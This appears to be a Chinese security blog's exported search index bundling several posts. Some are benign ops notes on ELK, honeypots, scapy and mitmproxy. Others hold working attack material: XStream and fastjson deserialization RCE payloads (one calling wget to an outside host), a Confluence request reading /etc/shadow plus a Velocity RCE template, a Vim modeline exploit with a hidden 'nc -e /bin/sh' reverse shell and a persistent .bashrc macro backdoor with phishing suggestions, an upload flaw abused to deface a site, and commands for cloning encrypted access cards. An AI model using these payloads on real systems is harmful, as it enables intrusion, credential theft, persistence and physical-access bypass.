<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[scapy发送TLS自定义包]]></title>
    <url>%2F2019%2F09%2F10%2Fscapy%E5%8F%91%E9%80%81TLS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85%2F</url>
    <content type="text"><![CDATA[00 安装配置scapy直接从github上下载scapy源码，然后进入到目录中运行即可。由于TLS并不是默认开启的layer，所以需要在配置项中的layer里加入tls。运行后输入TLS查看是否报错，如果没有报错说明TLS层的启用正常。 01 构造TLS请求经过一系列的研究尝试，得出如下构造hello包的代码：123456789sn = ServerName(servername="&lt;put server name here&gt;\x00\x00\x00\0")ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]), TLS_Ext_ServerName(servernames=[sn]), TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]), # noqa: E501 # TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]), TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss", "sha256+rsa"])]p = TLSClientHello(ciphers=0x1301, ext=ext)TLSClientAutomaton(server="mail.guahao.com",dport=995,client_hello=p).run() Servername那个参数可以替换成任意的服务器名即可达到我们的目的]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改tpot蜜罐为主控+探测器模式]]></title>
    <url>%2F2019%2F08%2F29%2F%E4%BF%AE%E6%94%B9tpot%E8%9C%9C%E7%BD%90%E4%B8%BA%E4%B8%BB%E6%8E%A7%2B%E6%8E%A2%E6%B5%8B%E5%99%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[0x00 关于tpot相关Tpot我个人理解是一个比较不错的高集成度的蜜罐系统，里面有很多的蜜罐使用docker封装起来独立运行。tpot则将每一个独立的蜜罐的日志格式整理起来最终通过ELK的形式统一展示，效果非常不错，下面是控制端的图：这界面，这特效，没什么好说的就是棒，就是赛博朋克！另外dashboard的模板不止一个，所以很不错，搜索那边日志也分割的很清晰，可以搜集到很多有用的信息。如果我们不需要主控和探测分离，也就是所有的东西都装在一台机器上的话，可以不用看后面的内容，只需要找个可以上传自定义镜像的vps，然后安装标准版然后打开即可用，没有什么好说的。现在我们希望实现的是如下模式： ————-> sensor1controller | —————>sensor2即部署主从模式的蜜罐，仅仅在外网部署N个探测器，然后将日志信息全部集中到一台主控端上进行分析处理。我翻了一下tpot，貌似没有天生将主控和探测器分离安装，因此要实现这种形式需要手工进行分离ELK。既然整个tpot日志分析都基于ELK，那么我们要做的也很简单，将elasticsearch和kibana分离出来作为主控端，每个sensor上部署logstash，logstash的日志发送地址全部发送到主控的elasticsearch就好了。补一个tpot的地址：tpot官网 0x01 提取主控 为了提取主控中的ES和logstash以及其他可能比较喜欢的辅助工具，可以先在自己的本地起个虚拟机，安装标准版的tpot，即安装的时候选择standard，等待安装完毕。 然后我们要做的就是完成安装后进到系统里，默认启动后会自动启动所有的docker实例。使用docker命令将我们需要的实例单独打包成镜像倒出来，我们最需要的目前是elasticsearch、kibana、logstash，如果还有其他需要的也可以倒出来。打包成镜像的命令为：123sudo docker commit xxxx:xxx //commit container to imagessudo docker save xxxx &gt; xxx.tar //package the image to tarsudo docker inspect xxx //details of image or container 然后把打包好的tar包保存起来，放到需要成为主控的地方重新转成container：1sudo docker load -i xxx.tar //import images from tar 这里要注意的是es的容器其使用了虚拟机本地的data目录，建议把data目录里的数据一并考出去然后使移植过的es容器的data目录挂载到这个目录上，类似于：1sudo docker run -d -p 59200:9200 -v /mnt/nas/honeyportdata:/data:rw --name tpotes tpotes /usr/share/elasticsearch/bin/elasticsearch PS：建议在迁移的时候关注一下这几个容器的详细信息，里面会写着端口映射、目录映射、执行命令等，通过docker inspect命令。 0x02 sensor和主控 首先我们要先部署tpot，找一个可以支持自定义镜像上传的vps厂家，我使用的是vultr，虚拟机一定要选8G4核以上的配置，不然会出一堆问题。 然后进入到安装界面就没什么好说的了，省去不说了，在VPS上我们选择安装模式的时候记得选sensor，因为我们只需要VPS上具备探测器功能即可。 将之前分离出来的logstash镜像的tar包上传到sensor上，根据这个镜像起一个docker的容器实例。 主控这边使用之前提取出来的es和kibana镜像在本地创建实例，然后将复制出来的es的data目录映射到容器的es里，起来即可0x03 打通主控与sensor之间的日志传递 先来说说logstash，主要是负责收集sensor的日志并发送给es，直接通过docker exec进入到logstash容器中，修改其配置文件，将本地的es地址改为远程接收的地址，保存重启容器即可。 再来看看es，建议es先加个密码认证，密码认证直接在es容器里使用es自己的命令，里面有个生成password命令，敲一下跟着流程走就好，记录下密码后记得在logstash里也配上密码。其次确保ES的端口对外暴露，安全起见可以防火墙限制IP访问。es和logstash两边都通，logstash能正常推送给es就会在本地看到数据了。 如果ES在局域网内网，可能需要通过一些代理映射打通，如果通过花生壳之类的将ES映射到域名上，由于logstash不能配置域名，因此可以在sensor上在装个nginx进行反带处理，其他流程一致。 另外由于sensor与es之间可能网络不太好，建议配置nginx反带的超时时间长一些，logstash也配置一下超时时间，太短了容易一直报错0x04 目前存在的疑惑连续好几次挂了一晚上，sensor上的容器就全部丢失了，很奇怪没有查到原因。0x05 其他本文仅仅是一个思路的概括和一些坑的提示，具体ELK怎么操作和配置建议自行学习掌握，没那么复杂。]]></content>
      <categories>
        <category>蜜罐</category>
      </categories>
      <tags>
        <tag>honeypot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK安装使用相关记录]]></title>
    <url>%2F2019%2F08%2F13%2FELK%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 ELK大概介绍ELK就是elastic search+logstash+kibana，然后logstash通常还要配上beats，简单的逻辑是：beats -> logstash->elastic search ->kibana beats是轻量型的数据采集装置，采集好数据后发送给logstash logstash就像是一个日志搜集管道，里面带了一些日志格式的过滤插件，最后整合成统一格式的数据发送给elasticsearch elasticsearch拿到数据后存起来就可以开始根据配置进行搜索了，提供了restful的接口 kibana作为开源通用的界面帮助我们快速的利用elasticsearch进行搜索 0x01 ELK安装Ubuntu为例，现在官方提供了一系列的安装方式，可以直接参照官方文档进行安装即可。这里使用的是apt的安装方式： sudo apt-get install apt-transport-https echo “deb https://artifacts.elastic.co/packages/7.x/apt stable main” | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list sudo apt-get update &amp;&amp; sudo apt-get install elasticsearch logstash kibana beats的话要根据实际采集的数据格式去下载，比如mysql的话去下载mysqlbeats 0x02 配置密码认证 elasticsearch上新版本已经集成了xpack，进入到bin目录下，使用elasticsearch-setup-password interactive来交互性的设置密码，并且将密码记录下来 kibana中需要配置es的user和password选项，并且注意kibana的basepath logstash中在output的es配置中配置正确的hosts、user、password选项，注意logstash的hosts可以接受域名，但是域名和端口必须能用IP访问，为了解决这个问题可以使用nginx代理来代理一层 0x99 java环境ELK依赖于Java环境，官方说最好建议使用oracle jdk8，oracle现在下载jdk需要登陆注册，因此直接手工去下载包解压缩后手工配置。 创建java的目录：mkdir /usr/lib/jvm 下载并解压tar包：sudo tar -zxvf /home/Downloads/jdk-8u221-linux-x64.tar.gz -C /usr/lib/jvm 为了便于java版本管理，这里使用Linux包版本管理工具update-alternatives其本质是软连接的管理，因此我们直接将javahome做软连接 sudo update-alternatives —install /usr/local/jdk jdk /usr/lib/jvm/jdk-8u22XXXXXX 300 然后将该软连接的jdk目录写入到环境变量中作为javahome： 12345#set oracle jdk environmentexport JAVA_HOME=/usr/local/jdk ## 这里要注意目录要换成自己解压的jdk 目录export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 以后如果需要切换jdk版本，先通过install的方式注册jdk，然后通过命令：update-alternatives —config jdk来进行切换，install的时候后面的数字是优先级，在auto模式的时候有用默认根据数字大的优先作为版本使用]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xstream-1.4.10反序列化漏洞]]></title>
    <url>%2F2019%2F07%2F25%2Fxstream-1.4.10%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload123456789101112131415&lt;sorted-set&gt;&lt;string&gt;foo&lt;/string&gt;&lt;dynamic-proxy&gt;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&lt;handler class="java.beans.EventHandler"&gt;&lt;target class="java.lang.ProcessBuilder"&gt;&lt;command&gt;&lt;string&gt;ping&lt;/string&gt;&lt;string&gt;xxxxx&lt;/string&gt;&lt;/command&gt;&lt;/target&gt;&lt;action&gt;start&lt;/action&gt;&lt;/handler&gt;&lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 可能的变形(似乎并不行)：1&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125; 0x02 说明XML的payload是没问题的，json这些是改的，不见得可以，主要问题在于那个XML属性不知道怎么对应到json格式，不过xstream的反序列化函数确实是支持json和XML同时传入的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xstream</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson的RCE漏洞复现记录]]></title>
    <url>%2F2019%2F07%2F13%2Ffastjson%E7%9A%84RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。关于开关fastjson的autotype以及白名单配置https://github.com/alibaba/fastjson/wiki/enable_autotype 0x01 关于反序列化之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考fastjson漏洞分析，http://xz.aliyun.com/t/5680可以绕过黑名单和autotypesuport的校验。 0x02 payload{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。将下面这个github里的历史payload改造成上面这种就好了github历史payload 0x03 一些利用利用的思路可以看看这个文章fastjson利用总结，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）新增： fastjson\&lt;1.2.58版本的新的利用链https://github.com/mikuKeeper/CVE-2019-12384该利用链同样适用于Jackson，不如说本来也就是Jackson那边爆出来的0x04 利用的时候一些重点注意事项 利用的时候其实会受到目标使用的jdk版本影响，如果要绕过jdk版本的话需要利用的绕过方法也受到目标是否存在对应利用链的问题 利用的时候ldap和rmi其实一定程度上是等价的，建议使用ldap 利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题 ldap收到了请求就可以认为目标存在fastjson漏洞，至于能不能饶过版本限制就是后面的事情了，可以根据这个特性做个批量检测工具 关于版本饶过的详细总结可以看这个饶过jdk版本限制 貌似在未开启autotypesuport配置情况下，需要发两次请求触发缓存 利用时候的exp本身也需要满足jdk版本要求，比较简单的做法是使用jdk6来生成exp 0x05关于测试环境测试环境可以使用vulhub的fastjson环境，该环境目前已知有两个问题： centos7可能会出现docker build失败的问题，rm命令执行错误，换个ubuntu就好了 该环境的jdk版本也是过高导致有限制，因此会导致无法触发reference的http请求从而命令执行问题，饶过参考上面，或者换个jdk版本 关于服务搭建，建议不要搭建rmi服务，因为目前看来和ldap等价，而ldap服务具有饶过的可能，因此直接使用ldap就好了。如果使用饶过则需要修改ladp服务器的部分代码，依旧是参考上面饶过的那篇文章最后提到的那段。bypass的github关于代码修改后的编译问题： mvn compile 会生产class文件，会产生不带依赖的jar包 mvn install 不仅会生产class还会生产jar和带依赖的jar 如果部分版本冲突可以尝试修改pom文件里的版本信息 java -cp Jar 包地址 person.server.LdapServer 就可以启动ldap服务，这个是通过编译的来的jar包里的class启动的server，通过marshalsec的话也是启动的marshalsec包里的ldap服务 0x06 扩展由于饶过姿势太多，后续可能考虑编写一个统一的检测工具，依赖于修改ldap服务器使其针对不同的请求返回不同的利用链payload，依照这个思路来做检测。 0x07 关于java反序列化几个工具可以看一下 marshalsec ysoserial Java反序列化备忘录文章备忘录javaruntime.exec payload生成KM29Nw2ydMpJ8kRz 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 ‘命令' |base64 | sed ':t;N;s/\n//;b t'&gt; tmp1 //生成基于commonscollections6的payload启动通过返回属性触发gadget的绕过方式的ldap：1java -cp fastjson-poc-1.0-SNAPSHOT-jar-with-dependencies.jar person.server.ldap_bypass_jdklimit.Ldap_javaSerializedData http://papa.mikudapangcin:11111/#Exploit 389 可以通过生成多个gadget来绕过限制]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[exe4j生成的exe文件反编译记录]]></title>
    <url>%2F2019%2F06%2F25%2Fexe4j%E7%94%9F%E6%88%90%E7%9A%84exe%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[exe4jExe4j是一款经典的讲java程序打包成一个exe程序的软件，没什么其他好说的。 识别是否exe4j我是通过程序中报错信息打印出的堆栈信息中含有exe4j包名来判断的，也可以直接通过下面提供的程序处理一下后看看生成的文件能不能用zip解压出java类来判断。 exe4j逆向处理程序代码直接贴出代码：12345678910111213141516171819202122import java.util.*;import java.io.*;public class gen &#123; public static void main(String args[]) throws IOException &#123; FileInputStream fin = new FileInputStream(args[0]); FileOutputStream fout = new FileOutputStream(args[1]); BufferedInputStream bin = new BufferedInputStream(fin); BufferedOutputStream bout = new BufferedOutputStream(fout); int in = 0; do &#123; in = bin.read(); if (in == -1) break; in ^= 0x88; bout.write(in); &#125; while (true); bin.close(); fin.close(); bout.close(); fout.close(); &#125;&#125; 将这个程序保存为gen.java，名字不可以改，通过以下命令来编译： 12javac gen.javajava gen.class 需要转换的exe文件名 转换后的输出文件名 使用zip解压软件直接解压输出的文件 正常解压后会出现java类文件，拖入jd-gui里就可以按照java逆向来走了]]></content>
      <categories>
        <category>客户端逆向</category>
      </categories>
      <tags>
        <tag>exe4j程序逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735]]></title>
    <url>%2F2019%2F06%2F20%2F%E5%9F%BA%E4%BA%8EVIM%E5%AE%8F%E7%9A%84%E5%90%8E%E9%97%A8-%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8VIM%E6%BC%8F%E6%B4%9ECVE-2019-12735%2F</url>
    <content type="text"><![CDATA[0x00 引言作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用进行了一些研究。由于本人是个菜的抠脚的脚本小子，因此并不会在这篇文章中去给大家解释漏洞原因，作为脚本小子我只关心如何利用。至于漏洞原因的一些解释可以去原作者的git上去看原作者GITHUB 0x01 漏洞复现先讲一下如何漏洞复现，复现该漏洞的基本条件是： Vim版本在影响范围内，目前大部分版本都有受影响，至少我最近开启的GCP上的ubuntu默认的vim版本在8.0左右是受影响的。 必须开启modeline选项，这个选项很关键，我的GCP上默认是不开启的，所以严重降低了该漏洞的危害，不太确定低版本或者是一些衍生版本的vim会不会默认开启。 复现poc1过程： 在～/.vimrc中加入set modeline确保开启该选项12. 使用原作者的第一个poc直接写入一个文件并保存：\`:!uname -a||" vi:fen:fdm=expr:fde=assertfails("source\!\ \%"):fdl=0:fdt=" `3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本 复现poc2过程：先来看看原作者在git上写着的poc2:1\x1b\[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert\_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b\[1G\x16\x1b\[KNothing here."\x16\x1b\[D \\n 如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）： 这里面涉及到的十六进制比如\x1b是需要通过二进制编辑器直接改成二进制的，复制黏贴是不行的。将poc中所有的十六进制位置编辑成二进制即可。 反斜杠的问题，原poc中作者为了转义特殊符号来显示所以多加了反斜杠，将所有涉及到转义的字符前面多一个的反斜杠“\”去掉就可以了 必要的话将最后的\n直接改成回车，如果\n在你的文本里没有被解释成回车的话 按照上面说的流程修改完poc后，我们在测试机本地起个nc监听：1nc -lvp 9999 最后打开poc2即可看到nc获取到了反弹链接。 0x02 改造poc2加入宏后门先来说说为什么要加入宏后门，poc2中有个问题，就是当vim打开一次文档后，就不会在携带有恶意代码了从而变成一个普通文档。虽然我们可以通过第一次建立连接后下载木马来获得持久的后门，但这个方式不在讨论范围内了。这里我的想法是先实现每次打开文档都会获得反弹链接的持久后门，而不是依赖于下载外部木马。Poc2其实加了很多代码用来伪装成正常文件内容，使人即使打开文件也不会察觉到里面藏有恶意代码，而poc1则会很明显看到代码执行。这个伪装有几个特点： 受影响版本的vim和cat打开都不会显示插入的恶意代码 cat -v可以看到恶意代码 不同版本的cat可能会看到一些显示的差异，但是恶意代码依旧是看不到的 为了不破坏伪装同时做成可持续的后门，比较菜的我只想到了利用vim宏来达到这个效果。 基本实现思路首先，我们希望的是每次vim文件都会执行代码，那么有没有可能使其每次vim文件的时候都执行一边vim宏呢？这是可能的，过程如下： 在vim窗口录制宏：q{寄存器名称}，录制完成后再按下q按键停止 在～/.bashrc中写入alias vim=vim -c ‘@{寄存器名称}’ 以及shopt -s expand_aliases，通过alias替换vim别名的方式来打开文件默认执行宏 那么只要管理员重新登录shell，以后不管他vim什么文件都会执行我们写在宏里的命令 接下来要做的就是在poc2中合适的地方加入录制宏的命令，其实poc2中那些十六进制比如\x1b是ESC的意思，可以联想到这个应该是vim中切换模式的按键，因此我们可以通过在ESC之后需要执行的命令之前加入qy来开始录制宏y，在命令执行完后某个合适的位置加入q来终止宏的录制。在试了很多次后最终有了以下exp：后门exp1 进一步优化上面那个poc依旧存在几个问题： 每次执行都会疯狂的往bashrc里插入alias那两句，只要vim一次就插一次，这很不好 没有伪装成正常文件内容 为了改善第一个问题，我们可以通过分开执行两次命令，然后宏只录制第一个命令（即反弹shell），第二个插入命令只执行一次。这听起来很容易，其实做起来并不容易……多次执行会遇到很多问题，因为我太菜了所以花了很长的时间。改善第二个问题，其实也远远没有想的那么简单，以为只是在空白处插入文本即可，其实不是的，原poc中的命令会对这些文本产生影响，所以写入什么样的文本都还是有点考究的。这边给出一个最终将这两个问题都解决了并且伪装成一个PHP一句话的案例：后门exp2最后还有个vim历史命令里会残留执行的命令的问题，这个可以通过插入一些垃圾vim命令来伪装。 0x03 思考总结考虑到这个漏洞需要开启modeline选项，所以危害严重降低。不过还是可以通过钓鱼来碰运气的，因为你说不好就有生产环境的vim开了这个。假设他们开了那么这个就会成为一个Linux上类似于win上的点击病毒，只要vim了就会中招，而且会随着原文件的copy同步来扩大。还有一些mbp用户也会中招，比如你在网上散播伪装成nginx.conf的文件，诱导那些可怜的开发者来下载使用。甚至于我们可以伪装成一个一句话木马上传到目标站点，至于他能不能执行都不重要，直接发邮件给管理员伪装成安全公司来告知他们扫描发现木马，建议他们通过vim打开文件确认后删除……总之开开脑洞还是可能有利用场景的，不过我个人认为吧，没错这个漏洞就是鸡肋玩具！最后如果有朋友知道具体哪些版本和可能的场景下vim会默认打开modeline选项，还请告知谢谢啦。]]></content>
      <categories>
        <category>客户端安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-12735</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-3396：confluence任意文件读取与RCE漏洞复现]]></title>
    <url>%2F2019%2F04%2F08%2FCVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[CVE-2019-3396的相关情报详细的漏洞解析参考cve-2019-3396 漏洞利用文件读取构造请求1234567891011121314151617POST /rest/tinymce/1/macro/preview HTTP/1.1Host: confluence.xxxxxx.comPragma: no-cacheCache-Control: no-cacheAccept: text/html, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: xxxxxxxContent-Type: application/json;charset=utf-8X-Requested-With: XMLHttpRequestConnection: closeContent-Length: 176&#123;"contentId":"655594","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"file:///etc/shadow”&#125;&#125;&#125; 通过template参数中使用file协议可以读取服务器上的任意文件 RCE由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：12#set($e="e")$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString() 随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓模拟器相关]]></title>
    <url>%2F2019%2F04%2F08%2F%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[安卓模拟器杂七杂八的记录adb常规操作adb基本操作可以参考mumu模拟器官方的文档，蛮详细的adb常规操作 app备份adb backup -f “D:\myfolder\myapp.ab” -apk \adb restore “D:\myfolder\myapp.ab” mumu模拟器夜神模拟器]]></content>
      <categories>
        <category> 移动安全攻防</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>黑灰产薅羊毛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MITMPROXY的摘要]]></title>
    <url>%2F2019%2F04%2F03%2FMITMPROXY%E7%9A%84%E6%91%98%E8%A6%81%2F</url>
    <content type="text"><![CDATA[MITMPROXY基本介绍没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb mitmproxyMitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。 貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。 支持通过正则配置替换规则来对内容进行替换 支持过滤，过滤语法参考mitmproxy filter 似乎支持TCP代理，但是不能对TCP流进行修改 支持websocket 支持socks proxy 支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考mitmproxy透明模式mitmdumpMitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。关于脚本编写的一些案例可以参考mitmproxy-scriptingmitmwebmitmproxy的web版本没有更多想说的 其他重点记录暂无]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>http抓包</tag>
        <tag>MITMPROXY</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bilibili子域名根目录挂黑页问题记录]]></title>
    <url>%2F2019%2F04%2F03%2Fbilibili%E5%AD%90%E5%9F%9F%E5%90%8D%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%8C%82%E9%BB%91%E9%A1%B5%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[昨天在群里看群友在反馈一个上传接口存在任意文件上传的问题，但是B站的管理员以content-type限制并不能造成实际影响为由认为这个问题可控，事实上确实有限制，群友们一致认为除了对客服钓鱼以外也难以利用这个缺陷。于是我也一起看了看这个接口，从而有了这个记录。 业务背景先来看看漏洞所在的业务位置：B站某客服系统具体截图：可以看到有个上传附件的功能，问题就在这个地方出现的。这个系统主要是由第三方公司承建的，所以存在较多的问题而且B站也因为一些原因只能做整体加固不能对其进行代码修改。原来的设计就是可以上传任意后缀名的附件并提供给客服审核，所以再不济也会存在钓鱼的问题。 漏洞情况没有太多好说的，就是个任意文件上传：主要问题和一些实际情况： 所有参数均可控，控制后可以改变最终路径 filename参数中会对一些特殊符号做过滤或者转义，而pid参数则相对过滤比较松 type参数是一个字典，如果为空就不会出现在路径中，目前已知的值是msg，设成msg会出现在路径中 Picture目录内可以任意写，写完后会返回路径并且可以直接访问 超过网站根目录的写直接返回400错误 对于网站根目录的写返回是成功的，但是访问的时候会显示404（指自定义文件名的时候） 上传会根据后缀名不同返回不同的content-type，基本限定在plain、img、和二进制类型，不认识的一律返回二进制contenttype web根目录可以访问，返回content-type是html 难点： content-type限制死了，在picture目录下的content-type均不能当作页面解析，也不能作为js被调用 web根目录下常规文件名均返回404，容易使人认为并没有上传成功过思考： 假设上传没有权限，如超过网站根目录，返回的是400，但是这有个问题，网站根目录和picture目录之间的上传返回的是200OK，因此推断上传可能是成功的，假设上传成功，那么404应该是nginx层面做了限制 假设是nginx层面做了限制，并且web根目录访问后是一片白，看到返回的content-type是html，那么就肯定存在默认页面比如index.html。 如果前面推测没有问题，那么进而尝试覆盖index.html或者是其他可能的默认页面文件名。 结论：尝试覆盖index.html毫无疑问是成功的，那么至少得出可以挂黑页了，并且可以用来打全站的cookies，或者是钓鱼等等。附上一张弹窗：引申： 考虑到系统框架用的是java系列，可能是stuts2或者是SpringMVC，我觉得是struts2，还可以在深挖一些东西通过覆盖一些系统框架文件来获取权限。因此我认为是存在getshell的可能的，或者使用框架漏洞来尝试 管理员说这个系统是网络隔离的，就算被攻陷风险也可控，但在我看来，如果真的被getshell，考虑到是个客服系统，可以通过构造一些更复杂的攻击payload去尝试攻击那些引用这个系统数据的内部系统，当然也可以用来钓鱼。 长期用以监控用户反馈，伪装客服对反馈用户进行诈骗也是可能的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小米手环刷公司门禁]]></title>
    <url>%2F2019%2F04%2F02%2F%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81%2F</url>
    <content type="text"><![CDATA[主要参考的这篇文章PN532全加密门禁卡模拟成功 记一下破解密码的相关命令 mfcuk -C -R 0:A -s 250 -S 250 #该命令貌似是破解密钥但是我没成功过，它在链接我的NFC设备的时候总报错 mfoc -O test.dmp #该命令是可以把内容整个dump出来并且可以破解key的 nfc-list #该命令是libnfc中带着的命令，可以列出UID nfc-mfsetuid xxxxxx #该命令也是libnfc中用来设置UID的命令 nfc-mfclassic w a test.dmp #该命令是用来将数据整个写入到卡里，我理解上是直接复制卡内容，但是好像是有限制的，我在复制的时候也不确定有没有成功。PS：小米手环模拟卡片后不知道为什么使用mfoc -O xxx.dmp不能dump里面的数据，但基本可以确定数据已经复制进去了。不过后来我发现虽然那些门禁卡都是加密卡，但是起作用的只是UID，所以一定程度上我们只需要复制UID就可以了。复制UID复制UID的流程就很简单了： 将需要复制的卡放到读卡器上使用nfc-list读书UID并记录 将空白卡放到读卡器上使用nfc-mfsetuid设置上面的UID 小米手环复制非加密卡功能来复制空白卡即可（因为小米限制了复制加密卡）复制加密内容经过测试部分门禁还是会校验加密内容，如果测试过只复制UID无效情况下，可以尝试下面的方法把加密内容一起复制进去，虽然手环在命令读取下没有数据返回但是通过测试发现应该还是有写入成功的。 mfoc -O test.dmp #来复制卡片内容同时会破解卡片 先通过复制UID的过程让小米手环模拟白卡 修改test.dmp文件中，将除了有数据的64blok保留其他都删掉 按照文章中所示修改对应行的数据 nfc-mfclassic w a test.dmp #将文件内的数据写入到卡片里PS：读卡器可能会因为驱动问题写入失败，多试几次确保写入成功。]]></content>
      <categories>
